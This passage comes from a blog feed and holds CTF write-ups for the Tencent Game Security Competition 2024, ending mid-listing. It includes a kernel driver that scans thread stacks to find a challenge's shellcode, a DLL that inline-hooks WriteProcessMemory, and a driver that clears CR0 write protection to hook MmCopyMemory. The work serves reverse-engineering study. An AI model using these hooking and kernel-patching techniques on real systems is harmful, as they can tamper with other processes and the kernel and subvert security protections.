class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ntifs.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstrsafe.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BACKTRACE_DEPTH 20</span></span><br><span class="line">ULONG64 num = <span class="number">0</span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">EnumerateKernelThreads</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(*ZWQUERYSYSTEMINFORMATION)</span><span class="params">(ULONG, PVOID, ULONG, PULONG)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">DRIVERUNLOAD</span><span class="params">(_In_ <span class="keyword">struct</span> _DRIVER_OBJECT* DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">kprintf</span>((<span class="string">&quot;unload\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">EnumerateKernelThreads</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    PETHREAD T12 = <span class="literal">NULL</span>;</span><br><span class="line">    PETHREAD T;</span><br><span class="line">    <span class="built_in">PsLookupThreadByThreadId</span>(<span class="number">12</span>, &amp;T12);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;T12=%p\n&quot;</span>), T12);</span><br><span class="line">    ULONG64 Start = *(ULONG64 *)((ULONG64)T12 + <span class="number">0x620</span>);</span><br><span class="line">    HANDLE TargetThread = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">16</span>; i &lt; <span class="number">0x20000</span>; i+=<span class="number">4</span>) &#123;</span><br><span class="line">        T = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">PsLookupThreadByThreadId</span>(i, &amp;T);</span><br><span class="line">        <span class="keyword">if</span> (T) &#123;</span><br><span class="line">            ULONG64 Startaddr = *(ULONG64 *)((ULONG64)T + <span class="number">0x620</span>);</span><br><span class="line">            <span class="keyword">if</span> (Startaddr == Start) &#123;</span><br><span class="line">                <span class="built_in">kprintf</span>((<span class="string">&quot;Found Thread=%p pThread=%p\n&quot;</span>), i,T);</span><br><span class="line">         </span><br><span class="line">                TargetThread = i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (T != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ULONG64 StackBase = <span class="number">0</span>;</span><br><span class="line">        ULONG64 StackLimit = <span class="number">0</span>;</span><br><span class="line">        StackBase= *(ULONG64 *)((ULONG64)T + <span class="number">0x38</span>);</span><br><span class="line">        StackLimit=*(ULONG64 *)((ULONG64)T + <span class="number">0x30</span>);</span><br><span class="line">        <span class="built_in">kprintf</span>((<span class="string">&quot;Stackbase=%p StackLimit=%p\n&quot;</span>), StackBase, StackLimit);</span><br><span class="line">        <span class="keyword">for</span> (ULONG64 addr = StackBase<span class="number">-0x10</span> ; addr &gt; StackLimit; addr -= <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(addr, <span class="string">&quot;GameSec.exe&quot;</span>)) &#123;</span><br><span class="line">                <span class="built_in">kprintf</span>((<span class="string">&quot;Found string in %p\n&quot;</span>), addr);</span><br><span class="line">                <span class="type">uintptr_t</span> address;</span><br><span class="line">                <span class="keyword">for</span> (ULONG64 i = <span class="number">0x0</span>; i &lt;<span class="number">65536</span>; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    address = (*(ULONG64*)(addr<span class="number">-0x28</span>)) &amp; <span class="number">0xffffffff00000000</span>;</span><br><span class="line">                    address = address + <span class="number">0x1000</span>;</span><br><span class="line">                    address = address + (i&lt;&lt;<span class="number">16</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">MmIsAddressValid</span>((PVOID)address) &amp;&amp; *((ULONG64 *)address) == <span class="number">0x7C8B483024748B48</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">kprintf</span>((<span class="string">&quot;shellcode found in %p\n&quot;</span>), address);</span><br><span class="line">                        <span class="comment">//DbgBreakPoint();</span></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">kprintf</span>((<span class="string">&quot;hello xia0ji233\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">EnumerateKernelThreads</span>();</span><br><span class="line">pDriver-&gt;DriverUnload = DRIVERUNLOAD;</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先运行 Loader.sys，再运行EmurateThread.sys，可以成功输出shellcode的地址。</p><img src="/2024/04/22/tencent-race-2024-pre-final/23.png" class=""><h5 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h5><p>随后我发现线程结构体中的 TrapFrame 有点东西，通过一段时间的运行之后，发现它的一些寄存器中会带上点东西</p><img src="/2024/04/22/tencent-race-2024-pre-final/24.png" class=""><p>这里我选 Rdx，取前8位，暴力搜索4位（65536，可接受范围内）匹配。</p><img src="/2024/04/22/tencent-race-2024-pre-final/25.png" class=""><p>先运行 Loader.sys 再运行 Search3.sys，可以直接得到 shellcode 的地址。</p><h5 id="方法4"><a href="#方法4" class="headerlink" title="方法4"></a>方法4</h5><p>观察到 ETHTREAD 结构体中有个指针指向了距离shellcode比较近的位置</p><img src="/2024/04/22/tencent-race-2024-pre-final/26.png" class=""><p>获取这个指针的前八位，然后爆破，匹配特征码。</p><img src="/2024/04/22/tencent-race-2024-pre-final/27.png" class=""><p>先运行Loader.sys，再运行 Search4.sys，即可获得shellcode的地址。</p><h5 id="方法5"><a href="#方法5" class="headerlink" title="方法5"></a>方法5</h5><p>挂起线程，此时会将线程上下文保存在栈顶中，再去遍历一遍栈，获得RIP指针，这里判断只需要拿 RSP 即可，当 [addr+0x180]-0x400&#x3D;&#x3D;addr（+0x180是RSP相对于上下文结构体的偏移，0x400是context上下文大小）时，取出 RIP 即可。</p><p>先运行 Loader.sys，在运行search5.sys，即可输出shellcode。</p>]]></content>
    
    
    <summary type="html">决赛打五天，是真的顶级</summary>
    
    
    
    <category term="ctf" scheme="https://xia0ji233.github.io/categories/ctf/"/>
    
    <category term="reverse" scheme="https://xia0ji233.github.io/categories/ctf/reverse/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="GameSec" scheme="https://xia0ji233.github.io/categories/Windows/GameSec/"/>
    
    
  </entry>
  
  <entry>
    <title>腾讯游戏安全大赛2024初赛题解</title>
    <link href="https://xia0ji233.github.io/2024/04/15/tencent-race-2024-pre/"/>
    <id>https://xia0ji233.github.io/2024/04/15/tencent-race-2024-pre/</id>
    <published>2024-04-14T16:00:00.000Z</published>
    <updated>2024-04-15T02:06:02.906Z</updated>
    
    <content type="html"><![CDATA[<p>报名参加了一下2024的游戏安全竞赛，今天初赛结束，总体来说赛题质量还是非常高的。</p><p><a href="attachment.zip">解题附件下载</a></p><span id="more"></span><h2 id="2024-腾讯游戏安全大赛初赛"><a href="#2024-腾讯游戏安全大赛初赛" class="headerlink" title="2024 腾讯游戏安全大赛初赛"></a>2024 腾讯游戏安全大赛初赛</h2><h3 id="参赛人员信息"><a href="#参赛人员信息" class="headerlink" title="参赛人员信息"></a>参赛人员信息</h3><p>略</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="找到内存中的两串token，作为答案提交（2分）。"><a href="#找到内存中的两串token，作为答案提交（2分）。" class="headerlink" title="找到内存中的两串token，作为答案提交（2分）。"></a>找到内存中的两串token，作为答案提交（2分）。</h4><p>先工具分析一下，发现加了 VM，动调发现对很多工具有检测，部分改名可以直接绕过，但是 CE 怎么改都会被检测，所以先上微步基本分析一下行为：</p><p><a href="https://s.threatbook.com/report/file/1bc2f607b5e4707a70a32bb78ac72c9b895f00413ba4bd21229f6103757ca19f">https://s.threatbook.com/report/file/1bc2f607b5e4707a70a32bb78ac72c9b895f00413ba4bd21229f6103757ca19f</a></p><p>注意到了有注入行为，一般会通过 <code>WriteProcessMemory</code> 这个 API 进行，于是编写 DLL 去hook看看情况。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。 hack.dll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">BOOL</span> <span class="params">(*Func)</span><span class="params">( HANDLE hProcess,</span></span><br><span class="line"><span class="params">     LPVOID lpBaseAddress,</span></span><br><span class="line"><span class="params">     LPCVOID lpBuffer,</span></span><br><span class="line"><span class="params">     SIZE_T nSize,</span></span><br><span class="line"><span class="params">     SIZE_T* lpNumberOfBytesWritten</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line">Func OriginFunc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">BYTE HookCode[] = &#123;</span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">//mov rax , xxx</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0xE0</span>                                          <span class="comment">//jmp rax</span></span><br><span class="line">&#125;;</span><br><span class="line">BYTE OriginCode[<span class="number">0x50</span>];</span><br><span class="line">SIZE_T HookLen = <span class="keyword">sizeof</span>(HookCode);</span><br><span class="line">DWORD saved=<span class="number">0</span>;</span><br><span class="line">WCHAR FILENAME[MAX_PATH];</span><br><span class="line">BOOL <span class="title function_">HackWriteProcessMemory</span><span class="params">(HANDLE hProcess,</span></span><br><span class="line"><span class="params">    LPVOID lpBaseAddress,</span></span><br><span class="line"><span class="params">    LPCVOID lpBuffer,</span></span><br><span class="line"><span class="params">    SIZE_T nSize,</span></span><br><span class="line"><span class="params">    SIZE_T* lpNumberOfBytesWritten</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    VirtualProtect(OriginFunc, HookLen, PAGE_EXECUTE_READWRITE, &amp;saved);</span><br><span class="line">    <span class="built_in">memcpy</span>(OriginFunc, OriginCode,HookLen);             <span class="comment">//unhook</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Call WriteProcessMemory(%p,%p,%p,%d,%p)&quot;</span>,hProcess,lpBaseAddress,lpBuffer,nSize,lpNumberOfBytesWritten);</span><br><span class="line">    GetModuleFileNameEx(hProcess, <span class="literal">NULL</span>, FILENAME, MAX_PATH);</span><br><span class="line">    wprintf(<span class="string">L&quot;ProcessName=%s\n&quot;</span>, FILENAME);</span><br><span class="line">    BOOL ret=OriginFunc(hProcess, lpBaseAddress, lpBuffer, nSize,lpNumberOfBytesWritten);</span><br><span class="line">    <span class="built_in">memcpy</span>(OriginFunc, HookCode, HookLen);               <span class="comment">//rehook</span></span><br><span class="line">    VirtualProtect(OriginFunc, HookLen, saved, &amp;saved);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hack</span><span class="params">()</span> &#123;</span><br><span class="line">    OriginFunc = WriteProcessMemory;</span><br><span class="line">    VirtualProtect(OriginFunc, HookLen, PAGE_EXECUTE_READWRITE, &amp;saved);</span><br><span class="line">    <span class="built_in">memcpy</span>(OriginCode, OriginFunc,HookLen); <span class="comment">//saved</span></span><br><span class="line">    *(__int64*)(HookCode + <span class="number">2</span>) = (__int64)HackWriteProcessMemory;<span class="comment">//build</span></span><br><span class="line">    <span class="built_in">memcpy</span>(OriginFunc, HookCode, HookLen);  <span class="comment">//Hook</span></span><br><span class="line">    VirtualProtect(OriginFunc, HookLen, saved, &amp;saved);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hook done\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH: &#123;</span><br><span class="line">        AllocConsole();</span><br><span class="line">        freopen(<span class="string">&quot;CONOUT$&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="built_in">stdout</span>);</span><br><span class="line">        hack();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一块没什么进展，但是突然发现这个进程对其它进程有些操作</p><img src="/2024/04/15/tencent-race-2024-pre/1.png" class=""><p>这不就是 token1 嘛，但是发现底下没有这个文件，尝试创建这个文件，发现直接就有内容写进去了，用命令可以打印出来。</p><img src="/2024/04/15/tencent-race-2024-pre/2.png" class=""><p>于是 token1 就出来了，很神奇。 <code>token1: 757F4749AEBB1891EF5AC2A9B5439CEA</code>。</p><p>对于token2，一直尝试做一些 API 的 hook 想看看它干了啥，这里我做了 MmCopyMemory 的 hook。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BACKTRACE_DEPTH 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOL <span class="string">L&quot;\\??\\xia0ji2333&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line">UINT64 BaseAddr=<span class="literal">NULL</span>, DLLSize=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">CreateDevice</span><span class="params">(PDEVICE_OBJECT driver)</span> &#123;</span><br><span class="line">    NTSTATUS status;</span><br><span class="line">    UNICODE_STRING MyDriver;</span><br><span class="line">    PDEVICE_OBJECT device = <span class="literal">NULL</span>;</span><br><span class="line">    RtlInitUnicodeString(&amp;MyDriver, <span class="string">L&quot;\\DEVICE\\xia0ji233&quot;</span>);</span><br><span class="line">    status = IoCreateDevice(</span><br><span class="line">        driver,</span><br><span class="line">        <span class="keyword">sizeof</span>(driver-&gt;DeviceExtension),</span><br><span class="line">        &amp;MyDriver,</span><br><span class="line">        FILE_DEVICE_UNKNOWN,</span><br><span class="line">        FILE_DEVICE_SECURE_OPEN,</span><br><span class="line">        FALSE,</span><br><span class="line">        &amp;device</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (status == STATUS_SUCCESS) &#123;</span><br><span class="line">        UNICODE_STRING Sym;</span><br><span class="line">        RtlInitUnicodeString(&amp;Sym, SYMBOL);</span><br><span class="line">        status = IoCreateSymbolicLink(&amp;Sym, &amp;MyDriver);</span><br><span class="line">        <span class="keyword">if</span> (status == STATUS_SUCCESS) &#123;</span><br><span class="line">            kprintf((<span class="string">&quot;Line %d:xia0ji233: symbol linked success\n&quot;</span>), __LINE__);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            kprintf((<span class="string">&quot;Line %d:xia0ji233: symbol linked failed status=%x\n&quot;</span>), __LINE__, status);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;Line %d:xia0ji233: create device fail status=%x\n&quot;</span>), __LINE__, status);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteDevice</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: start delete device\n&quot;</span>), __LINE__);</span><br><span class="line">    <span class="keyword">if</span> (pDriver-&gt;DeviceObject) &#123;</span><br><span class="line">        UNICODE_STRING Sym;</span><br><span class="line">        RtlInitUnicodeString(&amp;Sym, SYMBOL);<span class="comment">//CreateFile </span></span><br><span class="line">        kprintf((<span class="string">&quot;Line %d:xia0ji233: Delete Symbol\n&quot;</span>), __LINE__);</span><br><span class="line">        IoDeleteSymbolicLink(&amp;Sym);</span><br><span class="line">        kprintf((<span class="string">&quot;Line %d:xia0ji233: Delete Device\n&quot;</span>), __LINE__);</span><br><span class="line">        IoDeleteDevice(pDriver-&gt;DeviceObject);</span><br><span class="line">    &#125;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: end delete device\n&quot;</span>), __LINE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> newcode[] = &#123;</span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="comment">//mov rax,xxx</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0xE0</span><span class="comment">//jmp rax</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> oldcode[] = &#123;</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *target;</span><br><span class="line"></span><br><span class="line">KIRQL <span class="title function_">WPOFFx64</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    KIRQL irql = KeRaiseIrqlToDpcLevel();</span><br><span class="line">    UINT64 cr0 = __readcr0();</span><br><span class="line">    cr0 &amp;= <span class="number">0xfffffffffffeffff</span>;</span><br><span class="line">    __writecr0(cr0);</span><br><span class="line">    _disable();</span><br><span class="line">    <span class="keyword">return</span> irql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">WPONx64</span><span class="params">(KIRQL irql)</span></span><br><span class="line">&#123;</span><br><span class="line">    UINT64 cr0 = __readcr0();</span><br><span class="line">    cr0 |= <span class="number">0x10000</span>;</span><br><span class="line">    _enable();</span><br><span class="line">    